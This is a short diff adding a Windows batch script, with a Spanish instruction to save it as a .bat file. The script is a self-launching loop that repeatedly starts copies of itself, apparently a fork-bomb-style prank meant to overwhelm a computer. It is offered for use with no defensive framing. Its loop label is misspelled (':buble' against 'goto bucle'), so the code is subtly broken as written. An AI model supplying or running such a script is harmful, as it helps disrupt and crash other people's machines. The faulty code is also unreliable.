@@ -1,0 +1,5 @@
+Se guarda como .bat para que funcione(se debe de crear un archivo de texto insertar el codigo y guardarlo como .bat)
+
+:buble
+start archivo.bat
+goto bucle
